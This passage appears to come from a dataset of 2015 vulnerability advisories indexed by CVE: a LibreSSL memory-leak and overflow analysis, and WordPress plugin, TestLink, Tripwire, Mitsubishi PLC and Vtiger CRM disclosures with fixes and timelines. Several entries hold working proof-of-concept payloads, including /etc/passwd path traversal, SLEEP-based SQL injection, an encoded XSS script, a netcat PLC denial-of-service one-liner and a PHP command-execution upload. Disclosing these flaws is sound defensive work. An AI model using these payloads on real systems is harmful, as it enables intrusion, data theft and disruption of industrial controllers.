in a loop, because only the last one will be free()d, after the end of
the loop:
489 int
490 OBJ_obj2txt(char *buf, int buf_len, const ASN1_OBJECT *a, int no_name)
491 {
...
494 char *bndec = NULL;
...
516 len = a->length;
...
519 while (len > 0) {
...
570 bndec = BN_bn2dec(bl);
571 if (!bndec)
572 goto err;
573 i = snprintf(buf, buf_len, "".%s"", bndec);
...
598 }
...
601 free(bndec);
...
609 }
This memory leak allows remote attackers to cause a denial of service
(memory exhaustion) or trigger the buffer overflow described below.
========================================================================
Buffer Overflow (CVE-2015-5334)
========================================================================
As a result of CVE-2014-3508, OBJ_obj2txt() was modified to ""Ensure
that, at every state, |buf| is NUL-terminated."" However, in LibreSSL,
the error-handling code at the end of the function may write this
null-terminator out-of-bounds:
489 int
490 OBJ_obj2txt(char *buf, int buf_len, const ASN1_OBJECT *a, int no_name)
491 {
...
516 len = a->length;
517 p = a->data;
518
519 while (len > 0) {
...
522 for (;;) {
523 unsigned char c = *p++;
524 len--;
525 if ((len == 0) && (c & 0x80))
526 goto err;
...
528 if (!BN_add_word(bl, c & 0x7f))
529 goto err;
...
535 if (!bl && !(bl = BN_new()))
536 goto err;
537 if (!BN_set_word(bl, l))
538 goto err;
...
542 if (!BN_lshift(bl, bl, 7))
543 goto err;
...
546 }
...
553 if (!BN_sub_word(bl, 80))
554 goto err;
...
561 if (buf_len > 1) {
562 *buf++ = i + '0';
563 *buf = '';
564 buf_len--;
565 }
...
569 if (use_bn) {
570 bndec = BN_bn2dec(bl);
571 if (!bndec)
572 goto err;
573 i = snprintf(buf, buf_len, "".%s"", bndec);
574 if (i == -1)
575 goto err;
576 if (i >= buf_len) {
577 buf += buf_len;
578 buf_len = 0;
579 } else {
580 buf += i;
581 buf_len -= i;
582 }
...
584 } else {
585 i = snprintf(buf, buf_len, "".%lu"", l);
586 if (i == -1)
587 goto err;
588 if (i >= buf_len) {
589 buf += buf_len;
590 buf_len = 0;
591 } else {
592 buf += i;
593 buf_len -= i;
594 }
...
597 }
598 }
599
600 out:
...
603 return ret;
604
605 err:
606 ret = 0;
607 buf[0] = '';
608 goto out;
609 }
First, in order to trigger this off-by-one buffer overflow, buf must be
increased until it points to the first out-of-bounds character (i.e.,
until buf_len becomes zero):
- on the one hand, this is impossible with the code blocks at lines
561-564, 579-581, and 591-593;
- on the other hand, this is very easy with the code blocks at lines
576-578 and 588-590 (the destination buffer is usually quite small;
for example, it is only 80 bytes long in X509_NAME_oneline()).
Second, the code must branch to the err label:
- the ""goto err""s at lines 574-575 and 586-587 are unreachable, because
snprintf() cannot possibly return -1 here;
- the ""goto err"" at lines 525-526 is:
. very easy to reach in LibreSSL <= 2.0.4;
. impossible to reach in LibreSSL >= 2.0.5, because of the ""MSB must
be clear in the last octet"" sanity check that was added to
c2i_ASN1_OBJECT():
286 /*
287 * Sanity check OID encoding:
288 * - need at least one content octet
289 * - MSB must be clear in the last octet
290 * - can't have leading 0x80 in subidentifiers, see: X.690 8.19.2
291 */
292 if (len <= 0 || len > INT_MAX || pp == NULL || (p = *pp) == NULL ||
293 p[len - 1] & 0x80) {
294 ASN1err(ASN1_F_C2I_ASN1_OBJECT, ASN1_R_INVALID_OBJECT_ENCODING);
295 return (NULL);
296 }
- the remaining ""goto err""s are triggered by error conditions in various
BIGNUM functions:
. either because of a very large BIGNUM (approximately 64 megabytes,
which is impossible in the context of an SSL handshake, where X.509
certificates are limited to 100 kilobytes);
. or because of an out-of-memory condition (which can be reached
through the memory leak described above).
This off-by-one buffer overflow allows remote attackers to cause a
denial of service (crash) or possibly execute arbitrary code. However,
when triggered through X509_NAME_oneline() (and therefore d2i_X509()),
this buffer overflow is stack-based and probably not exploitable on
OpenBSD x86, where it appears to always smash the stack canary.
========================================================================
Acknowledgments
========================================================================
We would like to thank the LibreSSL team for their great work and their
incredibly quick response, and Red Hat Product Security for promptly
assigning CVE-IDs to these issues."
4038,CVE-2015-7683: Absolute Path Traversal in the Font WordPress Plugin,,CVE-2015-7683,"Details
================
Software: Font
Version: 7.5
Homepage: https://wordpress.org/plugins/font/
CVE: CVE-2015-7683 (Pending)
CVSS: 6.3 (Medium; AV:N/AC:M/Au:S/C:C/I:N/A:N)
CWE: CWE-22
Description
================
An absolute path traversal vulnerability in Font 7.5 allows WordPress admins read access to system files such as /etc/passwd. Font is a WordPress plugin with over 40,000 active installs.
Vulnerability
================
The vulnerability is due to the unsanitized POST parameter 'url' being passed to file_get_contents() via file_get_contents2().
From font/Font.php:
139: $contents = $this->file_get_contents2($_POST['url'], array_merge($dataArr, $serializedArr));
. . .
515: function file_get_contents2($src, $postData = false) {
. . .
550: $fileContents = @file_get_contents($src, false, $context);
Proof of Concept
================
URL: http://localhost/wordpress/wp-content/plugins/font/AjaxProxy.php
POST data:
url=/etc/passwd&data%5Bblogurl%5D=http%3A%2F%2Flocalhost%2Fwordpress&data%5Bversion%5D=7.5&format=json&action=cross_domain_request
Remediation
================
Upgrade the plugin to version 7.5.1 or higher.
Timeline
================
2015-09-29: Discovered
2015-09-30: Contacted vendor via plugin support form
2015-10-01: Reported vulnerability to wordpress.org
2015-10-02: CVE-2015-7683 assigned
2015-10-04: Vendor releases version 7.5.1 - confirmed fixed
2015-10-12: Public Disclosure
References
================
[1] https://cwe.mitre.org/data/definitions/22.html
Discovered by
================
David Moore @grajagandev"
4039,CVE-2015-7682: Multiple Blind SQL Injections in Pie Register WordPress Plugin,,CVE-2015-7682,"Details
================
Software: Pie Register
Version: 2.0.18
Homepage: https://github.com/GTSolutions/Pie-Register
CVE: CVE-2015-7682 (Pending)
CVSS: 3.5 (Low; AV:N/AC:M/Au:S/C:P/I:N/A:N)
CWE: CWE-89
Description
================
Two blind SQL injection vulnerabilities in Pie Register 2.0.18 allow SQL injection by admins leading to loss of database confidentiality. Pie Register is a WordPress plugin with over 10,000 active installs.
Vulnerabilities
================
The vulnerabilities are due to the unsanitized POST parameters invitaion_code_bulk_option and invi_del_id:
Injection 1:
From pie-register/pie-register.php:
576: $this->delete_invitation_codes($_POST['select_invitaion_code_bulk_option']);
. . .
3521: $sql = ""DELETE FROM `$codetable` WHERE `id` IN ( "".$ids."" )"";
Injection 2:
From pie-register/pie-register.php:
1941: if($wpdb->query(""DELETE FROM "".$codetable."" WHERE id = "".$_POST['invi_del_id']))
Proof of concept
================
URL: http://localhost/wordpress/wp-admin/admin.php?page=pie-invitation-codes
Injection 1:
POST data:
select_invitaion_code_bulk_option=1)%20OR%20SLEEP(15)%3d0%20LIMIT%201--&invitaion_code_bulk_option=delete&btn_submit_invitaion_code_bulk_option=Apply
Injection 2:
POST data:
piereg_invitation_nonce=66e7e6383d&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fadmin.php%3Fpage%3Dpie-invitation-codes&invi_del_id=1%20OR%20SLEEP(15)%3d0%20LIMIT%201--
Remediation
================
Upgrade the plugin to version 2.0.19 or higher.
Timeline
================
2015-09-23: Discovered
2015-09-24: Contacted vendor via website support form
2015-09-28: Vendor supplied security contact email
2015-09-28: Requested CVE
2015-09-30: Report sent to vendor and wordpress.org
2015-10-02: Vendor releases version 2.0.19 on Github - confirmed fixed
2015-10-12: Public Disclosure
References
================
[1] http://codex.wordpress.org/Class_Reference/wpdb#Protect_Queries_Against_SQL_Injection_Attacks
Discovered by
================
David Moore @grajagandev"
4040,CVE-2015-7377: Unauthenticated Reflected XSS in Pie Register WordPress Plugin,,CVE-2015-7377,"Details
================
Software: Pie Register
Version: 2.0.18
Homepage: https://github.com/GTSolutions/Pie-Register
CVE: CVE-2015-7377 (Pending)
CVSS: 4.3 (Medium; AV:N/AC:M/Au:N/C:N/I:P/A:N)
CWE: CWE-79
Description
================
An unauthenticated reflected XSS vulnerability in Pie Register 2.0.18 allows malicious script injection via the invitaion_code parameter. Pie Register is a WordPress plugin with over 10,000 active installs.
Vulnerability
================
The vulnerability is due to the unsanitized GET parameter invitaion_code:
From: pie-register/pie-register.php:
647: $inv_code = base64_decode($_GET['invitaion_code']);
. . .
662: <h2><?php _e(""Activation Code"",""piereg"");echo "" : "".$inv_code; ?></h2>
Proof of concept
================
The payload is Base64 encoded.
http://localhost/wordpress/?page=pie-register&show_dash_widget=1&invitaion_code=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
Tested on Firefox 41.0 and Chrome 45.0.2454.85.
Remediation
================
Upgrade the plugin to version 2.0.19.
Timeline
================
2015-09-23: Discovered
2015-09-24: Contacted vendor via website support form
2015-08-24: Requested CVE
2015-09-28: Vendor supplied security contact email
2015-09-30: Report sent to vendor and wordpress.org
2015-10-02: Vendor releases version 2.0.19 on Github - confirmed fixed
2015-10-12: Public Disclosure
References
================
[1] http://codex.wordpress.org/Data_Validation
Discovered by
================
David Moore @grajagandev"
4058,TestLink Security Advisory - SQL Injection Vulnerability - CVE-2015-7390,,CVE-2015-7390,"Information
--------------------
Advisory by Netsparker.
Name: SQL Injection Vulnerability in TestLink 1.9.13
Affected Software : TestLink
Affected Versions: 1.9.1.3 and possibly below
Vendor Homepage : http://testlink.org/
Vulnerability Type : SQL Injection
Severity : Critical
Status : Fixed
CVE-ID : CVE-2015-7390
Netsparker Advisory Reference : NS-15-015
Description
--------------------
If your web application is vulnerable to SQL injection, a hacker is
able to execute any malicious SQL query or command through the web
application.
Technical Details
--------------------
Proof of Concept URLs for SQL Injection vulnerability in TestLink:
Page: lnl.php
Parameter Name: apikey
Parameter Type: GET
Attack Pattern: '+(SELECT 1 FROM (SELECT SLEEP(25))A)+'
For more information on SQL Injection vulnerabilities read the
following article:
https://www.netsparker.com/web-vulnerability-scanner/vulnerability-security-checks-index/sql-injection/
Advisory Timeline
--------------------
15/09/2015 - First Contact
02/10/2015 - Vendor Fixed
05/10/2015 - Advisory Released
Solution
--------------------
https://github.com/TestLinkOpenSourceTRMS/testlink-code/releases/tag/1.9.14
Credits & Authors
--------------------
These issues have been discovered by Omar Kurt while testing
Netsparker Web Application Security Scanner
(https://www.netsparker.com).
About Netsparker
--------------------
Netsparker web application security scanners find and report security
flaws and vulnerabilities such as SQL Injection and Cross-site
Scripting (XSS) in all websites and web applications, regardless of
the platform and technology they are built on. Netsparker scanning
engine’s unique detection and exploitation techniques allow it to be
dead accurate in reporting vulnerabilities, hence it does not report
any false positives. The Netsparker web application security scanner
is available in two editions; Netsparker Desktop and Netsparker Cloud.
Visit our website https://www.netsparker.com for more information.
--
Onur Yılmaz - National General Manager
Netsparker Web Application Security Scanner
T: +90 (0)554 873 0482"
4061,[CVE-2015-7670] Multiple SQL Injection in Support Ticket System 1.2 WordPress plugin,,CVE-2015-7670,"Vulnerability title: SQL Injection in Support Ticket System 1.2 WordPress plugin
CVE: CVE-2015-7670
Vendor: Tim Dahlmanns
Product: Support Ticket System
Affected version: 1.2
Fixed version: 1.2.1
Reported by: Ib�ria Medeiros
Vulnerability Details:
=====================
It was discovered that no protection against SQL injection attack was implemented, resulting in an attacker being able to retrieve users and ticket data from database; and insert data about users and tickets in the database; then using these data in future attacks.
The Support Ticket System 1.2 WordPress plugin is vulnerable to 5 SQLI injection (SQLI) vulnerabilities.
The includes/update.php file is vulnerable to SQLI attacks via $user and $id parameters.
System affected:
===============
Any system that access to a web site developed by WordPress CMS version 4.3.1 or earier and uses the Support Ticket System v.1.2 or early.
Advisory:
========
https://wordpress.org/plugins/simple-support-ticket-system/changelog/
Solution:
========
Update to Support Ticket System v.1.2.1 plugin
https://wordpress.org/plugins/simple-support-ticket-system/
Disclosure Timeline:
===================
Vendor notification: September 29, 2015
Vendor fixed vulnerability: October 6, 2015
Public advisory: October 6, 2015
Public disclosure: October 6, 2015"
4079,CVE-2015-6237 - Tripwire IP360 VnE Remote Administrative API Authentication Bypass/Privilege Acquisition Vulnerability,,CVE-2015-6237,"Document Title
================
Tripwire IP360 VnE Remote Administrative API Authentication
Bypass/Privilege Acquisition Vulnerability
Affected Products
===================
Vendor: Tripwire
Software/Appliance: IP360 VnE Vulnerability Manager
Affected (verified) versions: v7.2.2 -> v7.2.5
CVE
=====
CVE-2015-6237
CVSS
=======
CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/RL:O/RC:C
Base Score: 10.0
Temporal Score: 9.5
Rating
=========
Critical
Vulnerability Summary
======================
The IP350 VnE is susceptible to a remote XML-RPC authentication
bypass vulnerability, which allows for specially crafted privileged
commands to be remotely executed without authentication. The RPC
service is available on the public HTTPS interface of the VnE by
default, and cannot be disabled.
Impact
========
Successful exploitation will allow a remote unauthenticated
attacker to execute commands and queries against the API normally
only available to privileged users. Attack vectors include the
ability to enumerate all local/remote users, reset any password of
a user on the system, and manipulate IP filter restrictions for any
user. Users configured to use external authentication sources (e.g.
LDAP) can have a local password created and made usable by an
attacker while the authorized user continues to use external
authentication. The combined vectors could allow for remote
administrative privilege acquisition.
Remediation
=============
Update to v7.2.6
Credits
==========
This vulnerability was discovered and reported by Specto
(specto [at] custodela [dot] com).
Relevant Timeline
====================
18/08/2015: Initial vendor contact
19/08/2015: Vulnerability provided to vendor
19/08/2015: Vulnerability accepted by vendor
25/08/2015: Vulnerability confirmed by vendor
30/09/2015: Update with vulnerability fix released by vendor
01/10/2015: Advisory posted"
4106,Re: CVE-2015-3938 Remote Permanent LoV (Loss of View) in Mitsubishi Melsec FX3G-24M PLC,,CVE-2015-3938,"The ICS-CERT will shortly publish an advisory on its own: ICSA-15-146-01
It has calculated the CVSS-Score to be 7.1 (AV:N/AC:M/Au:N/C:N/I:N/A:C)
We have updated the CVSS Score in our advisory on
http://www.os-s.net/advisories/mitsubishi_fx3ge_parameter_error-engl.pdf
Ralf Spenneberg
Am Dienstag, 29. September 2015, 12:30:35 schrieb Ralf Spenneberg:
> OS-S Security Advisory 2015-03
>
> Date: September 29th, 2015
> CVE: CVE-2015-3938
> CVSS: 5 (AV:N/AC:L/Au:N/C:N/I:N/A:P)
>
> Title: Mitsubishi ICS FX3G-24M Permanent Communication Denial of Service
>
> Severity: Critical.
> The TCP/IP communication of the Mitsubishi Melsec FX3G-24 is
> permanently disrupted.
>
> Ease of Exploitation: Trivial
>
> Vulnerability type: Wrong input validation (buffer overflow?)
>
> Products: Mitsubishi Melsec FX3G-24M
>
> Abstract
> The Mitsubishi Melsec FX3G-24M is a highly integrated Industrial Control
> System (ICS). Many functions of the ICS may be controlled via the built-in
> HTTP-Server. By using specially crafted HTTP-messages all Ethernet based
> communication may be permanently disrupted. This permanent denial of Service
> can only be corrected via a cold restart of the ICS.
> Detailed product description
> We confirmed the bug on the following system:
> FX3G-24M
> CPU-Version: 2.10
> FX3U-ENET-ADP Version: 1.20
> Further products or firmware versions have not been tested
>
> Description
> The built-in HTTP application is unable to handle parameters with a length
> of 100 bytes or more. This is true for all tested URLs but /fx_devmon.html.
> Even parameters not used by the web applications trigger the DoS bug. This
> security weakness can be exploited using both POST and GET HTTP requests.
> As soon as any parameter with a length of at least 100 characters is
> transmitted all Ethernet/IP/TCP communication is permanently halted. A
> connected HMI looses its connection, the HTTP server is not available any
> more and the System does not respond to ICMP ping requests or ARP requests.
> The ICS has to undergo a cold restart be interrupting the power supply. The
> PLC still continues to execute the internal logic program. Only the
> Ethernet based communication is disrupted.
>
> Proof of Concept
> The following command (all on one line) crafts an GET request and sends it
> to the PLC running on the IP address 192.168.155.80:
> python -c ""print 'GET /index.html?'+'A'*100 +' HTTP/1.1 '"" | nc
> 192.168.155.80 80
>
> As soon as the command returns the communication is disrupted.
>
> Severity and Ease of Exploitation
> The security weakness can be easily exploited. No special tools are
> necessary. The Exploit neither requires physical access to the ICS nor does
> it require direct access to the ICS network. The exploit can be executed
> across routers and if the ICS is connected to the internet across the
> Internet. The HTTP- request is a normal and valid request and will not be
> detected or prevented by Firewalls or Intrusion Prevention Systems.
> The disruption of the Ethernet based communication will cause a permanent
> loss of view on any connected HMIs and will prevent the communication of
> the ICS with other ICS systems via Ethernet.
>
> Vendor Communication
> We unsuccessfully tried to contact the vendor for several month. We could
> not find a security contact responsible for these products. On December 4th
> 2014 we contacted the ICS-CERT. The ICS-CERT contacted Mitsubishi.
> Mitsubishi released a new firmware in April 2015. The new firmware will
> only be available in all controllers shipped starting April 2015. Older
> controllers will not receive the firmware update.
>
> Formatted PDF:"
4110,CVE-2015-3938 Remote Permanent LoV (Loss of View) in Mitsubishi Melsec FX3G-24M PLC,,CVE-2015-3938,"OS-S Security Advisory 2015-03
Date: September 29th, 2015
CVE: CVE-2015-3938
CVSS: 5 (AV:N/AC:L/Au:N/C:N/I:N/A:P)
Title: Mitsubishi ICS FX3G-24M Permanent Communication Denial of Service
Severity: Critical.
The TCP/IP communication of the Mitsubishi Melsec FX3G-24 is
permanently disrupted.
Ease of Exploitation: Trivial
Vulnerability type: Wrong input validation (buffer overflow?)
Products: Mitsubishi Melsec FX3G-24M
Abstract
The Mitsubishi Melsec FX3G-24M is a highly integrated Industrial Control
System (ICS). Many functions of the ICS may be controlled via the built-in
HTTP-Server. By using specially crafted HTTP-messages all Ethernet based
communication may be permanently disrupted. This permanent denial of Service
can only be corrected via a cold restart of the ICS.
Detailed product description
We confirmed the bug on the following system:
FX3G-24M
CPU-Version: 2.10
FX3U-ENET-ADP Version: 1.20
Further products or firmware versions have not been tested
Description
The built-in HTTP application is unable to handle parameters with a length of
100 bytes or more. This is true for all tested URLs but /fx_devmon.html. Even
parameters not used by the web applications trigger the DoS bug. This security
weakness can be exploited using both POST and GET HTTP requests.
As soon as any parameter with a length of at least 100 characters is
transmitted all Ethernet/IP/TCP communication is permanently halted. A
connected HMI looses its connection, the HTTP server is not available any more
and the System does not respond to ICMP ping requests or ARP requests.
The ICS has to undergo a cold restart be interrupting the power supply.
The PLC still continues to execute the internal logic program. Only the
Ethernet based communication is disrupted.
Proof of Concept
The following command (all on one line) crafts an GET request and sends it to
the PLC running on the IP address 192.168.155.80:
python -c ""print 'GET /index.html?'+'A'*100 +' HTTP/1.1 '"" | nc
192.168.155.80 80
As soon as the command returns the communication is disrupted.
Severity and Ease of Exploitation
The security weakness can be easily exploited. No special tools are necessary.
The Exploit neither requires physical access to the ICS nor does it require
direct access to the ICS network. The exploit can be executed across routers
and if the ICS is connected to the internet across the Internet. The HTTP-
request is a normal and valid request and will not be detected or prevented by
Firewalls or Intrusion Prevention Systems.
The disruption of the Ethernet based communication will cause a permanent loss
of view on any connected HMIs and will prevent the communication of the ICS
with other ICS systems via Ethernet.
Vendor Communication
We unsuccessfully tried to contact the vendor for several month. We could not
find a security contact responsible for these products. On December 4th 2014
we contacted the ICS-CERT. The ICS-CERT contacted Mitsubishi. Mitsubishi
released a new firmware in April 2015. The new firmware will only be available
in all controllers shipped starting April 2015. Older controllers will not
receive the firmware update.

Formatted PDF:
--
OpenSource Security Ralf Spenneberg http://www.os-s.de
Am Bahnhof 3-5 48565 Steinfurt Germany
Fon: +49(0)2552 638 755 Fax: +49(0)2552 638 757"
4111,Vtiger CRM Authenticated Remote Code Execution (CVE-2015-6000),,CVE-2015-6000,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Vtiger CRM Authenticated Remote Code Execution (CVE-2015-6000)
<http://b.fl7.de/2015/09/vtiger-crm-authenticated-rce-cve-2015-6000.html>
1. Summary
2. Vulnerability Details
3. Exploitation / Proof of Concept
4. Timeline
5. See Also
########## 1. Summary ##########
Vtiger CRM <https://www.vtiger.com/open-source/> is a CRM application.
Vtiger CRM version 6.3 (“Open Source” branch; released on 2015-06-04)
and lower are vulnerable to Authenticated Remote Code Execution.
########## 2. Vulnerability Details ##########
Vtiger CRM allows for the upload of a ""company logo"" from within the
administrative interface. The corresponding functionality can be
accessed on the ""CRM Settings"" page (Settings -> CRM Settings ->
Templates -> Company Details -> ""Edit"" button;
(<.../index.php?parent=Settings&module=Vtiger&view=CompanyDetails&block=4&fieldid=15>).
Multiple flaws in the Settings_Vtiger_CompanyDetailsSave_Action class
allow attackers to upload files with arbitrary file names and (almost)
arbitrary contents, including, but not limited to, PHP code passing
commands to the underlying operating system.
First, the file type check is based solely on the MIME type
(""Content-Type"") sent by the client:
(Source file: vtigercrm/modules/Settings/Vtiger/actions/CompanyDetailsSave.php)
class Settings_Vtiger_CompanyDetailsSave_Action extends Settings_Vtiger_Basic_Action {
[...]
$logoDetails = $_FILES['logo'];
$fileType = explode('/', $logoDetails['type']);
$fileType = $fileType[1];
if (!$logoDetails['size'] || !in_array($fileType, Settings_Vtiger_CompanyDetails_Model::$logoSupportedFormats)) {
$saveLogo = false;
}
This is followed by an insufficient check for PHP code inside the
uploaded file:
(Source file: vtigercrm/modules/Settings/Vtiger/actions/CompanyDetailsSave.php)
// Check for php code injection
$imageContents = file_get_contents($_FILES[""logo""][""tmp_name""]);
if (preg_match('/(<?php?(.*?))/i', $imageContents) == 1) {
$saveLogo = false;
}
Not only can this check be circumvented by using PHP short tags instead
of “<?php “. It also provides no protection whatsoever against uploads
of code written in scripting languages other than PHP, which, depending
on the system configuration, may or may not be executable.
Vtiger CRM then saves the uploaded file's contents with the
client-specified file name in the publicly accessible ""test/logo/""
directory:
(Source file: modules/Settings/Vtiger/models/CompanyDetails.php)
class Settings_Vtiger_CompanyDetails_Model extends Settings_Vtiger_Module_Model {
[...]
var $logoPath = 'test/logo/';
[...]
public function saveLogo() {
$uploadDir = vglobal('root_directory'). '/' .$this->logoPath;
$logoName = $uploadDir.$_FILES[""logo""][""name""];
move_uploaded_file($_FILES[""logo""][""tmp_name""], $logoName);
copy($logoName, $uploadDir.'application.ico');
}
Combining these flaws, an attacker can transfer arbitrary code to the
web server, as long as s/he provides a permitted MIME type (e.g.
""Content-Type: image/jpeg"") and avoids the string “<?ph” within the
code. The code can then be run by accessing the location of the uploaded
file (“<Vtiger URL>/test/logo/<attacker-specified file name>”).
########## 3. Exploitation / Proof of Concept ##########
Through a specially crafted HTTP-POST request, a PHP file is stored on
the server hosting the Vtiger CRM software:
POST /index.php HTTP/1.1
Host: [...]
Cookie: [...]
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------51732462825208
Content-Length: 2040
-----------------------------51732462825208
Content-Disposition: form-data; name=""__vtrftk""
[...]
-----------------------------51732462825208
Content-Disposition: form-data; name=""logo""; filename=""2.php""
Content-Type: image/jpeg
<? system('id; uname -a; /sbin/ifconfig -a'); system('cat ../../vtigerversion.php'); ?>
-----------------------------51732462825208
Content-Disposition: form-data; name=""address""
[...]
The resulting PHP file can then be accessed at <Vtiger
URL>/test/logo/2.php , which will execute the given commands and display
their output:
uid=3491(mussKV4JcX9c) gid=3491(mussKV4JcX9c) groups=3491(mussKV4JcX9c)
Linux [...] 3.2.0-77-virtual #114-Ubuntu SMP Tue Mar 10 17:38:02 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
eth0 Link encap:Ethernet HWaddr [...]
inet addr: [...]
########## 4. Timeline ##########
2015-08-28 Vulnerability reported to Vtiger.
2015-09-01 Vtiger acknowledges vulnerability.
2015-09-03 CVE-2015-6000 assigned by CERT/CC.
2015-09-28 Public disclosure.
########## 5. See Also ##########
CVE-2015-6000 at cve.mitre.org: <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6000>
CVE-2015-6000 at NVD: <http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-6000>
Source: <http://b.fl7.de/2015/09/vtiger-crm-authenticated-rce-cve-2015-6000.html>
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.0.21
iQIcBAEBAgAGBQJWCVMJAAoJEAg0a3ng3v4fyPQQAIQnPDewMWRG8SDvcbyRINPv
VSYigmW2toTjNYv6/I5a+34fz9D3S1z425+4dXeuZQyT7LDvKsgZhtzOJE9HKXW4
MfEfCfUE6iWg+GOcrBztoF09tOuTNd+06l+BGIb7a7xQO+656XA+jQ6AULE9nPtC
iaw4X3ArhA/nh1B3G5Bawz8AJxwC+bEjVG2sGeXaxbhLwiEtWD9Mfi+fZlMimr3k
kmn5tQ21PevU5dKS7i2Cl6ykwcV1hrR5E2vyxYzpjy25242qMdcNyvZnvs28zpKa
KV8CegrIo6N+sRyqBCd7aZfuZbDzkBaITq6C5Ae5VO5fnOHAfDM8gJG+SqH1enqM
c0oqWtQ6m3Fqyp9Mu012Qi3cu7ONAYRd9ehBBnj59TLNAZYNf2n1pHMAxK6d7Skt
9v7+hPff1MpZqjcV7L/RJryREznG1gIQltlrd6fjMdazs6BIETfWDr/jBK33lAUX
+rrWUX8H4JgFrlqXDpy0jTmom8mgNtb9qncQDxd5kpodSWE0SjTI8/zwm19qVX1G
mIDRLXWBHqN41mA2KC/ac9Ep3Yj5AQrFQ3jXVq4VmdCMB50LeSXn1HyWzc6dmqmt
+5Cct/NxIfXYXvcYAG+UkfOyxRDRZhhfw7PbUrI2fMx+vjoEuMDPDOcwmH/JSnU5
QufrotYWhaf1IkT21ZLr
=pq0q
-----END PGP SIGNATURE-----"
4119,Subject mail: CVE-2015-7320 - Multiple Reflective XSS in Appointment Booking Calendar 1.1.7 WordPress plugin,,CVE-2015-7320,"Vulnerability title: Multiple Reflective XSS in Appointment Booking Calendar 1.1.7 WordPress plugin
CVE: CVE-2015-7320
Vendor: WordPress DWBooster
Product: Appointment Booking Calendar
Affected version: 1.1.7
Fixed version: 1.1.8
Reported by: Ib�ria Medeiros
Vulnerability Details:
=====================
It was discovered that no protection against multiple reflective XSS attacks was implemented, resulting in an attacker being able to retrive user data from end user, such as session cookies.
The Appointment Booking Calendar 1.1.7 WordPress plugin is vulnerable to 3 reflective XSS vulnerabilities.
Three XSS vectors were identified in cpabc_appointments_admin_int_bookings_list.inc.php
System affected:
===============
Any system that access to a web site developed by WordPress CMS version 4.3.1 or higher and uses the Appointment Booking Calendar plugin v.1.1.7 or early.
Solution:
========
Update to Appointment Booking Calendar 1.1.8 plugin
Disclosure Timeline:
===================
Vendor Notification: September 22, 2015
Vendor fixed vulnerability: September 22, 2015
Public Disclosure: September 26, 2015"
4120,CVE-2015-7320 - Multiple Reflective XSS in Appointment Booking Calendar 1.1.7 WordPress plugin,,CVE-2015-7320,"Vulnerability title: Multiple Reflective XSS in Appointment Booking Calendar 1.1.7 WordPress plugin
CVE: CVE-2015-7320
Vendor: WordPress DWBooster
Product: Appointment Booking Calendar
Affected version: 1.1.7
Fixed version: 1.1.8
Reported by: Ib�ria Medeiros
Vulnerability Details:
=====================
It was discovered that no protection against multiple reflective XSS attacks was implemented, resulting in an attacker being able to retrive user data from end user, such as session cookies.
The Appointment Booking Calendar 1.1.7 WordPress plugin is vulnerable to 3 reflective XSS vulnerabilities.
Three XSS vectors were identified in cpabc_appointments_admin_int_bookings_list.inc.php
System affected:
===============
Any system that access to a web site developed by WordPress CMS version 4.3.1 or higher and uses the Appointment Booking Calendar plugin v.1.1.7 or early.
Solution:
========
Update to Appointment Booking Calendar 1.1.8 plugin
Disclosure Timeline:
===================
Vendor Notification: September 22, 2015
Vendor fixed vulnerability: September 22, 2015
Public Disclosure: September 26, 2015"
4121,CVE-2015-7319 - SQL Injection in Appointment Booking Calendar 1.1.7 WordPress plugin,,CVE-2015-7319,"Vulnerability title: SQL Injection in Appointment Booking Calendar 1.1.7 WordPress plugin
CVE: CVE-2015-7319
Vendor: WordPress DWBooster
Product: Appointment Booking Calendar
Affected version: 1.1.7
Fixed version: 1.1.8
Reported by: Ib�ria Medeiros
Vulnerability Details:
=====================
It was discovered that no protection against SQL injection attack was implemented, resulting in an attacker being able to update the username, gaining access with the new user.
The Appointment Booking Calendar 1.1.7 WordPress plugin is vulnerable to a SLI injection (SQLI) vulnerability.
A SQLI vector was identified in cpabc_appointments_admin_int_calendar_list.inc.php
System affected:
===============
Any system that access to a web site developed by WordPress CMS version 4.3.1 or higher and uses the Appointment Booking Calendar plugin v.1.1.7 or early.
Solution:
========
Update to Appointment Booking Calendar 1.1.8 plugin
Disclosure Timeline:
===================
Vendor Notification: September 22, 2015
Vendor fixed vulnerability: September 22, 2015
Public Disclosure: September 26, 2015"
4124,CVE-2015-5075 - Cross-Site Request Forgery In X2Engine Inc. X2Engine,,CVE-2015-5075,"Vulnerability title: Cross-Site Request Forgery In X2Engine Inc. X2Engine
CVE: CVE-2015-5075
Vendor: X2Engine Inc.
Product: X2Engine
Affected version: 4.2
Fixed version: 5.2
Reported by: Simone Quatrini
Details:
It was discovered that no protection against Cross-site Request Forgery attacks was implemented, resulting in an attacker being able to able to force the creation of a new administrative account.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2015-5075/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2015, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of Portcullis Computer Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. Any use of this information is at the user's risk. In no event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in connection with the use or spread of this information.
###############################################################
This email originates from the systems of Portcullis
Computer Security Limited, a Private limited company,
registered in England in accordance with the Companies
Act under number 02763799. The registered office
address of Portcullis Computer Security Limited is:
Portcullis House, 2 Century Court, Tolpits Lane, Watford,
United Kingdom, WD18 9RS.
The information in this email is confidential and may be
legally privileged. It is intended solely for the addressee.
Any opinions expressed are those of the individual and
do not represent the opinion of the organisation. Access
to this email by persons other than the intended recipient
is strictly prohibited.
If you are not the intended recipient, any disclosure,
copying, distribution or other action taken or omitted to be
taken in reliance on it, is prohibited and may be unlawful.
When addressed to our clients any opinions or advice
contained in this email is subject to the terms and
conditions expressed in the applicable Portcullis Computer
Security Limited terms of business.
###############################################################
#####################################################################################
This e-mail message has been scanned for Viruses and Content and cleared
by MailMarshal.
#####################################################################################"
